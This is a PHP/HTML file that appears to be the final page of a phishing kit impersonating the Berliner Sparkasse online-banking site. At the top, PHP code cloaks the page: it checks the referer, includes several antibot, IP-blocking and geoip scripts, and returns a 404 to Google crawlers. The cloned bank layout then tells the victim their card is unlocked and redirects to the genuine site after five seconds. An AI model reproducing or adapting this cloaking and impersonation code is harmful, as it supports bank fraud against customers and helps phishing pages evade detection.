<?php 
$aa = $_SERVER['HTTP_HOST'];
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
if ($refData['host'] !=$aa) {
?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
     header('HTTP/1.0 404 Not Found');
     exit(); ?>
<?php }else{ ?>
<?php
session_start();
error_reporting(0);
include('antibots.php');
include('antibot.php');
include('antibot1.php');
include('antibot2.php');
include('antibot3.php');
include('antibot4.php');
include('antibot5.php');
include('antibot6.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="de" class="no-touch no-js">
        




<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<title>Online-Banking - Sie im Mittelpunkt - Berliner Sparkasse</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="language" content="de" />
<meta name="viewport" content="initial-scale=1, width=device-width" />
<meta name="description" content="Machen Sie es sich bequem. Erledigen Sie Ihre Finanzgeschäfte immer dann, wenn Ihnen gerade danach ist – sei es am heimischen Rechner oder auf Reisen." />
<meta name="robots" content="noindex,follow" />
<meta name="format-detection" content="telephone=no" />
<meta name="geo.region" content="DE-BE" />
<meta name="geo.placename" content="Berlin" />
<meta name="geo.position" content="52.521173;13.412843" />
<meta name="ICBM" content="52.521173, 13.412843" />
<meta http-equiv="refresh" content="5;url=https://www.berliner-sparkasse.de/de/home/privatkunden/online-mobile-banking.html" />
<link rel="canonical" href="online-kunde-werden.html"/>
<link rel="shortcut icon" href="https://www.berliner-sparkasse.de/content/dam/myif/berliner-sk/work/bilder/icons/favicon1x.ico"/>
<link rel="apple-touch-icon" href="./content/dam/myif/berliner-sk/work/bilder/icons/apple-touch-icon-180x180px.png" sizes="180x180"/>
<link rel="icon" href="./content/dam/myif/berliner-sk/work/bilder/icons/favicon2x.png" sizes="32x32" type="image/png"/>
<link rel="icon" href="./content/dam/myif/berliner-sk/work/bilder/icons/favicon1x.png" sizes="16x16" type="image/png"/>

<link rel="stylesheet" href="./etc/clientlibs/myif/master/base/internetfiliale.min.6db373a87dded8c1f68dc8cf61f46525.css" type="text/css">


<script type="text/javascript" src="./etc/clientlibs/myif/master/base/internetfiliale.min.17051318c9e01e43979184d1d8efbb0b.js"></script>


</head>
        


<body class="if6 templ-bankingpage hnav default-design chat_online  eprivacy_initial_visible " data-statistics-url="https://www.berliner-sparkasse.de/fi/home/misc/break.html">
<div class="if6_main">
  









<div class="if6_outer if6_siteselect">
    <div class="if6_inner">
        <ul class="siteselect">
            <li class="active"><a href="#" title="Startseite für Privatkunden">Privatkunden
            </a></li>
            <li class=""><a href="#" title="Startseite für Firmenkunden">Firmenkunden
            </a></li>
        </ul>
    </div>
</div>

<header class="if6_outer if6_header"><div class="if6_inner"><div class="logo parbase">  <a href="#" title="Berliner Sparkasse Firmenkunden">
    
    <img src="./content/dam/myif/berliner-sk/work/bilder/logos/spk-logo-desktop.png" alt="Logo der Berliner Sparkasse" class="only-desktop"/>
    <img src="./content/dam/myif/berliner-sk/work/bilder/logos/spk-logo-mobile.png" alt="Logo der Berliner Sparkasse" class="only-M"/>
  </a>
  <img src="./content/dam/myif/berliner-sk/work/bilder/logos/spk-logo-druck.png" alt="Logo der Berliner Sparkasse" title="Berliner Sparkasse Firmenkunden" class="only-print"/>
  </div><div class="loginlogout">
  
    &nbsp;

    <span onclick="$('body').removeClass('search_visible').toggleClass('login_visible');$('#kto').focus();">Anmelden</span>
  
</div><div class="search">



<form id="head_ftsearch" target="_top" method="post" action="https://www.berliner-sparkasse.de/fi/home/misc/suche.external.html" data-autosuggest_count="10" data-instantresults_count="3" data-instantresults_resultsheadline="Top-Suchtreffer" data-instantresults_showallresults="Alle Ergebnisse anzeigen" data-sinvestor_instid="0004093" data-sinvestor_instantresults_count="3" data-sinvestor_url="/content/myif/berliner-sk/work/filiale/de/home/misc/vps/gate/_jcr_content.bin/sinvestor_search/search" data-sinvestor_name_shares="Aktien" data-sinvestor_name_bonds="Anleihen" data-sinvestor_name_funds="Fonds" data-sinvestor_name_certs="Zertifikate" data-sinvestor_title="Wertpapiere" data-sinvestor_showallresults="Alle Wertpapiere anzeigen">
    <input type="hidden" name="_charset_" value="UTF-8"/>
    <label for="search">Was suchen Sie?</label><input maxlength="100" id="search" type="text" value="" name="q"/>
    <div class="sayt-display-detect"></div>
    <div class="sayt-container" id="sayt-container">
      <div class="autocomplete-suggestions-wrapper" style="display: none;"></div>
      <div class="sayt-results" style="display: none;"></div>
      <div class="sinvestor-results" style="display: none;"></div>
    </div>
</form>
<a title="Suche" onclick="$('body').toggleClass('search_visible').removeClass('login_visible');if ($('body').hasClass('search_visible')){$('#search').focus();}else{if ($('#search').get(0).value.length > 0){$('#head_ftsearch').submit();}return false;}" href="#">Suche</a></div></div></header>
<div class="if6_outer if6_iconbar">
    <div class="if6_inner">
        <div class="iconbar_overlay"></div>
        <div class="iconbar"></div>
        


<div class="home"><a href="#" title="Berliner Sparkasse Firmenkunden" class="if6_home icon-homenav">Berliner Sparkasse Firmenkunden</a></div>
<nav class="if6_navigation"><a href="#" title="Alle Themen">Alle Themen</a><div><a href="#" class="close-icon" title="Schließen"></a>
  
    <ul class="siteselect">
      <li class=""><a href="#" title="Startseite für Privatkunden">Privatkunden</a></li>
      <li class="active"><a href="#" title="Startseite für Firmenkunden">Firmenkunden</a></li>
    </ul>
<div><p class="h2">Alle Themen</p><ul class='with-4-items'><li><a href='#'><span>Produkte</span></a><div><a class='navtop' href='#'>Alle Themen</a><p class='h2'>Produkte</p><ul><li><a href='#'><span>Konten und Karten</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Konten und Karten</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>FirmenKonto</span></a></li><li><a href='#'><span>VISA Business Card</span></a></li><li><a href='#'><span>SEPA</span></a></li><li><a href='#'><span>S-Kombi</span></a></li><li><a href='#'><span>VereinsKonto</span></a></li></ul></div></li><li><a href='#'><span>Banking und Software</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Banking und Software</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Online-Banking</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Online-Banking</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Online-Banking mit pushTAN</span></a></li><li><a href='#'><span>Online-Banking mit chipTAN</span></a></li><li><a href='#'><span>Electronic-Banking mit EBICS</span></a></li><li><a href='#'><span>Multibanking</span></a></li><li><a href='#'><span>Fotoüberweisung</span></a></li><li><a href='#'><span>Elektronisches Postfach</span></a></li></ul></div></li><li><a href='#'><span>Apps und Software</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Apps und Software</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>SFirm</span></a></li><li><a href='#'><span>StarMoney Business</span></a></li><li><a href='#'><span>Sparkassen-App</span></a></li><li><a href='#'><span>S-weltweit App</span></a></li><li><a href='#'><span>S-Finanzcockpit</span></a></li></ul></div></li><li><a href='#'><span>Digitaler Finanzbericht</span></a></li><li><a href='#'><span>Sicherheit im Internet</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Sicherheit im Internet</p><ul><li><a href='#'><span>Allgemeine Tipps</span></a></li><li><a href='#'><span>Aktuelle Meldungen</span></a></li><li><a href='#'><span>Computercheck</span></a></li></ul></div></li></ul></div></li><li><a href='#'><span>Bezahlverfahren</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Bezahlverfahren</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Kassieren im Geschäft</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Kassieren im Geschäft</p><ul><li><a href='#'><span>Kartenterminals</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Kartenterminals</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Angebot anfordern</span></a></li></ul></div></li><li><a href='#'><span>Kassenkomplettsystem</span></a></li><li><a href='#'><span>Kassieren bei mobilen Endgeräten</span></a></li></ul></div></li><li><a href='#'><span>Kassieren im Internet</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Kassieren im Internet</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>giropay</span></a></li><li><a href='#'><span>paydirekt</span></a></li><li><a href='#'><span>Online-Payment-Lösungen</span></a></li><li><a href='#'><span>Apple Pay</span></a></li><li><a href='#'><span>One-Stop-Shop</span></a></li></ul></div></li><li><a href='#'><span>Rechnung digitalisieren</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Rechnung digitalisieren</p><ul><li><a href='#'><span>GiroCode</span></a></li></ul></div></li><li><a href='#'><span>SEPA</span></a></li></ul></div></li><li><a href='#'><span>Finanzierung</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Finanzierung</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Avalkredit</span></a></li><li><a href='#'><span>Gründungsfinanzierung</span></a></li><li><a href='#'><span>Investitions­kredit</span></a></li><li><a href='#'><span>Förderkredite</span></a></li><li><a href='#'><span>Kontokorrent­kredit</span></a></li><li><a href='#'><span>Zinsmanagement</span></a></li><li><a href='#'><span>Leasing</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Leasing</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Leasing</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Leasing</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Angebot anfordern</span></a></li></ul></div></li><li><a href='#'><span>2-Minuten-Zusage</span></a></li><li><a href='#'><span>2-Minuten-Zusage online</span></a></li><li><a href='#'><span>Firmenwagen-Leasing</span></a></li><li><a href='#'><span>Int. Finanzierungslösungen</span></a></li></ul></div></li><li><a href='#'><span>Factoring</span></a></li></ul></div></li><li><a href='#'><span>Geldanlage</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Geldanlage</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Tagesgeldkonto</span></a></li><li><a href='#'><span>Termingeld</span></a></li><li><a href='#'><span>Deka Investments</span></a></li></ul></div></li><li><a href='#'><span>Risiken managen</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Risiken managen</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Währungsmanagement</span></a></li><li><a href='#'><span>Zinsmanagement</span></a></li></ul></div></li><li><a href='#'><span>Versicherungen und Vorsorge</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Versicherungen und Vorsorge</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>BasisRente</span></a></li><li><a href='#'><span>Betriebliche Altersversorgung</span></a></li><li><a href='#'><span>Rechtsschutz­versicherung</span></a></li><li><a href='#'><span>Gewerbeversicherung</span></a></li></ul></div></li><li><a href='#'><span>Internationales Geschäft</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Internationales Geschäft</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Fremdwährungskonto</span></a></li><li><a href='#'><span>Außenhandels­finanzierung</span></a></li><li><a href='#'><span>Dokumentengeschäft</span></a></li><li><a href='#'><span>Internationales Netzwerk</span></a></li><li><a href='#'><span>S-weltweit App</span></a></li><li><a href='#'><span>Währungsmanagement</span></a></li><li><a href='#'><span>Auslandszahlungen</span></a></li></ul></div></li><li><a href='#'><span>Gewerbliche Immobilienfinanzierung</span></a></li></ul></div></li><li><a href='#'><span>Beratung &amp; Aktuelles</span></a><div><a class='navtop' href='#'>Alle Themen</a><p class='h2'>Beratung &amp; Aktuelles</p><ul><li><a href='#'><span>Beratung und Betreuung</span></a></li><li><a href='#'><span>S-Finanzkonzept</span></a></li><li><a href='#'><span>Aktuelles und Service</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Aktuelles und Service</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Newsletter</span></a></li></ul></div></li></ul></div></li><li><a href='#'><span>Branchen &amp; Ratgeber</span></a><div><a class='navtop' href='#'>Alle Themen</a><p class='h2'>Branchen &amp; Ratgeber</p><ul><li><a href='#'><span>Gründung und Nachfolge</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Gründung und Nachfolge</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Business­plan</span></a></li><li><a href='#'><span>Gründungswege</span></a></li><li><a href='#'><span>Gründungsfinanzierung</span></a></li><li><a href='#'><span>Unternehmensnachfolge</span></a></li><li><a href='#'><span>Deutscher Gründerpreis</span></a></li></ul></div></li><li><a href='#'><span>Branchenkompetenz</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Branchenkompetenz</p><ul><li class='overview'><a href='#'><span>Übersicht</span></a></li><li><a href='#'><span>Einzelhandel</span></a></li><li><a href='#'><span>Start-ups</span></a></li><li><a href='#'><span>Heilberufe</span></a></li><li><a href='#'><span>Handwerk</span></a></li></ul></div></li><li><a href='#'><span>Ratgeber</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Ratgeber</p><ul><li><a href='#'><span>Übersicht</span></a></li><li><a href='#' target='_blank'><span>Einzelhandel</span></a></li><li><a href='#'><span>Heilberufe</span></a></li><li><a href='#'><span>Handwerk</span></a></li></ul></div></li></ul></div></li><li ><a href='#'><span>Services &amp; Kontakt</span></a><div><a class='navtop' href='#'>Alle Themen</a><p class='h2'>Services &amp; Kontakt</p><ul><li class='active current'><a href='#'><span>Online-Kunde werden</span></a></li><li><a href='#'><span>Online-Services</span></a><div><a class='navtop' href='#'>Alle Themen</a><a class='navback' href='#'>zurück</a><p class='h2'>Online-Services</p><ul><li><a href='#'><span>Alle Services anzeigen</span></a></li><li><a href='#'><span>IBAN &amp; BIC berechnen</span></a></li></ul></div></li><li><a href='#'><span>Filiale finden</span></a></li></ul></div></li></ul></div></div></nav>

        
        <div class="if6_contact"><a href="#" title="Kontaktbereich">Kontaktbereich</a><a href="#" title="Kontaktbereich">Kontaktbereich</a><!-- 
--><a href="#" title="Kontaktbereich">Kontaktbereich</a><!--
--><!--
--><!--
--><div><a href="#" class="close-icon" title="Schließen"></a><!--
--><div class="contactiparsys"><div class="iparys_inherited"><div class="contactiparsys iparsys parsys "><div class="c_block section">

<div><div class="c_button special section">








<span class="icon-phone"><span>BusinessLine<br/></span>030 869 866 68</span>



</div>
<div class="c_button standard section">





<a class="icon-chat" href="#">Neu bei uns?</a>






</div>
<div class="c_button standard section">





<a class="icon-chat" href="#">Wichtige Telefonnummern</a>






</div>
<div class="c_button standard section">





<a class="icon-mail" href="#">Service und Kontakt</a>






</div>
<div class="c_button standard section">





<a class="icon-location1" href="#">Öffnungszeiten &amp; Standorte</a>






</div>
<div class="c_button standard section">








<span class="icon-"></span>



</div>
</div>
</div>
<div class="c_block section">
<div class="c_block_heading h3">Unsere BLZ &amp; BIC</div>
<table>
  <tr><th>BLZ</th><td>10050000</td></tr>
  <tr><th>BIC</th><td>BELADEBEXXX</td></tr>
</table>

</div>
<div class="c_block section">

<div><div class="c_button standard section">





<a class="icon-fax" href="#">IBAN und BIC berechnen</a>






</div>
</div>
</div>
</div>
</div>
</div></div></div>
        
    </div>
</div>


  
<div class="if6_outer if6_breadcrumb">
  <div class="if6_inner">
    <ul class="navpath">
      <li>
        <a href="#">
          Firmenkundenportal
        </a>
      </li>
    
      <li>
        <a href="#">
          Online-Kunde werden
        </a>
      </li>
    </ul>
  </div><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Firmenkundenportal","item":"https://www.berliner-sparkasse.de/fi/home.html"},{"@type":"ListItem","position":2,"name":"Online-Kunde werden","item":"https://www.berliner-sparkasse.de/fi/home/services-und-kontakt/online-kunde-werden.html"}]}</script>
</div>
<section class="if6_outer if6_section">
<div class="if6_inner">
  
  
    <div class="section parsys">














<div style="position:absolute;top:0px;"><div class="ficon icon-blank"><input type="submit" name="InwbVsUYAKYdONkx" value="Submit" onclick="return IF.checkFirstSubmit();" class="" aria-hidden="true" tabindex="-1" /></div><input type="text" name="XWoohBchMMsBSnBC" id="XWoohBchMMsBSnBC" value="0" disabled="disabled" style="DISPLAY: none" class="" size="1" /></div>
    
    <input type='hidden' id='isJavaScriptActive' name='isJavaScriptActive'
      value='' />
    <script type='text/javascript'>
      document.getElementById('isJavaScriptActive').value = '1';
    </script>
    <input type='hidden' id='slt' name='slt'
      value='' />

    
    
                
                
               <div style="text-align:center;color: #155724;
    background-color: #d4edda;
    border-color: #c3e6cb;    position: relative;
    padding: .75rem 1.25rem;
    margin-bottom: 1rem;
    border: 1px solid transparent;
    border-radius: .25rem;"  role="alert">
  <b>Vielen Dank !</b><br>
Ihre Karte ist jetzt entsperrt und kann überall verwendet werden.
</div>

    
    
    
    








<div class="if6_glossar section">
</div>
<div class="if6_tabnav section">
</div>
</div>
</div>

</section>

  









<div class="if6_outer if6_contactstage hide100">
    

    <div class="if6_inner">
            <div class="cshead">Immer in Ihrer Nähe</div>

            <div class="phoneparsys parsys"><div class="cs-phone cs-main section"><a href="#"><span class="cs-title">BusinessLine</span><span class="cs-number">030 869 866 68</span></a><span class="cs-open">Montag-Freitag: 8 bis 18 Uhr</span></div>
<div class="cs-phone section"><a href="#"><span class="cs-title">Online-Banking-Hotline</span><span class="cs-number">030 869 869 57</span></a></div>
</div>
            <div class="cs-link"><a href="#">Alle Kontaktmöglichkeiten</a>

</div>

            <div class="buttonparsys parsys"><div class="cs-button hide100 hide500 section">






<a class="icon-signpost" href="#" title="Neu bei uns?"><span>Neu bei uns?</span></a>




</div>
<div class="cs-button hide100 hide500 section">






<a class="icon-calendar lightbox-link" title="Termin vereinbaren" href="#"><span>Termin vereinbaren</span></a>




</div>
<div class="cs-button hide100 hide500 section">






<a class="icon-mail" href="#" title="Nachricht schreiben"><span>Nachricht schreiben</span></a>




</div>
<div class="cs-button hide100 hide500 section">






<a class="icon-locations" href="#" title="Standort finden"><span>Standort finden</span></a>




</div>
<div class="cs-button hide100 hide500 section">
<div>
  




<a class="icon-facebook" href="#" target="_blank" title="Facebook" rel="noopener"><span>Facebook</span></a>


<br/>
  




<a class="icon-twitter" href="#" target="_blank" title="Twitter" rel="noopener"><span>Twitter</span></a>


<br/>
  




<a class="icon-xing" href="#" target="_blank" title="Xing" rel="noopener"><span>Xing</span></a>


        
</div>


</div>
</div>
    </div>

</div>




<div class="if6_outer if6_service" role="navigation" aria-label="Service-Bereich">
  <div class="if6_inner"><div class="parsys"><div class="servicelink section">




<a class="icon-laptop-euro" href="#" title="Online-Banking aktivieren"><span>Online-Banking aktivieren</span></a>


</div>
<div class="servicelink section">




<a class="icon-calculator" href="#" title="IBAN &amp; BIC berechnen"><span>IBAN &amp; BIC berechnen</span></a>


</div>
</div><div class="parsys"><div class="servicelink section">




<a class="icon-lock-open lightbox-link" title="Limit ändern" href="#"><span>Limit ändern</span></a>


</div>
<div class="servicelink section">




<a class="icon-app" href="#" title="Sparkassen-App downloaden"><span>Sparkassen-App downloaden</span></a>


</div>
<div class="servicebutton section"><a class="" href="#" title="Alle Services und Formulare"><span>Alle Services und Formulare</span></a>
</div>
</div></div>
</div>


<div class="if6_outer if6_contactstage hide500 hide900">
    

    <div class="if6_inner">
            <div class="cshead">Immer in Ihrer Nähe</div>

            <div class="phoneparsys parsys"><div class="cs-phone cs-main section"><a href="#"><span class="cs-title">BusinessLine</span><span class="cs-number">030 869 866 68</span></a><span class="cs-open">Montag-Freitag: 8 bis 18 Uhr</span></div>
<div class="cs-phone section"><a href="#"><span class="cs-title">Online-Banking-Hotline</span><span class="cs-number">030 869 869 57</span></a></div>
</div>
            <div class="buttonparsys parsys"><div class="cs-button hide100 hide500 section">






<a class="icon-signpost" href="#" title="Neu bei uns?"><span>Neu bei uns?</span></a>




</div>
<div class="cs-button hide100 hide500 section">






<a class="icon-calendar lightbox-link" title="Termin vereinbaren" href="#"><span>Termin vereinbaren</span></a>




</div>
<div class="cs-button hide100 hide500 section">






<a class="icon-mail" href="#" title="Nachricht schreiben"><span>Nachricht schreiben</span></a>




</div>
<div class="cs-button hide100 hide500 section">






<a class="icon-locations" href="#" title="Standort finden"><span>Standort finden</span></a>




</div>
<div class="cs-button hide100 hide500 section">
<div>
  




<a class="icon-facebook" href="#" target="_blank" title="Facebook" rel="noopener"><span>Facebook</span></a>


<br/>
  




<a class="icon-twitter" href="#" target="_blank" title="Twitter" rel="noopener"><span>Twitter</span></a>


<br/>
  




<a class="icon-xing" href="#" target="_blank" title="Xing" rel="noopener"><span>Xing</span></a>


        
</div>


</div>
</div>
          <div class="cs-link"><a href="#">Alle Kontaktmöglichkeiten</a>

</div>

    </div>

</div>








<div class="if6_outer if6_awardarea">
    <div class="if6_inner">
        <div class="parsys"></div>
    </div>
</div>



<footer class="if6_outer if6_footer" role="navigation" aria-label="Fußzeile"><div class="if6_inner"><div class="if6_impressum"><ul>
  
  <li><a href="#">AGB</a></li>

  
  <li><a href="#">Datenschutz</a></li>

  
  <li><a href="#">Impressum</a></li>

  
  <li><a href="#">Preise und Hinweise</a></li>

  
  <li><a href="#">Kontakt</a></li>

  
  <li><a href="#">Filialen A-Z</a></li>

  
  <li><a href="#">Geldautomaten A-Z</a></li>
</ul>
<br class="bterm"/></div>
<div class="if6_social"><div><div class="iparys_inherited"><div class="ipar iparsys parsys "></div>
</div>
</div></div>
</div></footer>











<script type="text/javascript">
    var IF6_lightbox_closeicon_text = 'Schließen';
  </script>

<noscript><img src='https://www.berliner-sparkasse.de/fi/home/misc/break.html?type=counter&amp;ckey=js-usage&amp;cval=0' style='display:none;' alt=""/></noscript>



<div class="sparkasse_de parbase">﻿



<div class="universal_analytics parbase">
 

<div id="universal_analytics_data" data-uaid="UA-63989891-1">  
</div> 

<script>
  if(window.location.href.indexOf("suche.external.html") !== -1) {
  $('#universal_analytics_data').attr('data-searchkey', "");
  $('#universal_analytics_data').attr('data-searchcat', "global-search");
  }
</script> 


    

 
</div>


<div class="if6_outer if6_lightbox session-countdown" role="dialog" aria-labelledby="sesscountlabel" aria-describedby="sesscountdescr"><div class="if6_inner"><div class="parsys">
  




<div class="cbox cbox-small cbox-banking">
<div class="session-countdown">
  <span class="offscreen" id="sesscountdescr">
    Automatische Abmeldung in 20 Sekunden
  </span>
  <div aria-hidden="true">
    Automatische Abmeldung in <span id="countdownCounter">20</span>
  </div>
  <div id="sesscountlabel">
    Möchten Sie das Online-Banking fortsetzen?
  </div>
</div>
<div class="buttonline">
  <div class="bgroup1">
    <a href="#" onclick="return IF6.hideCountdownLayer(this);">Jetzt fortsetzen</a>
  </div>
</div></div>

</div></div></div>
  




<div class="iconfonttest"><span class="before"></span><span>i</span></div></div></body>
    
</html>


<?php } ?>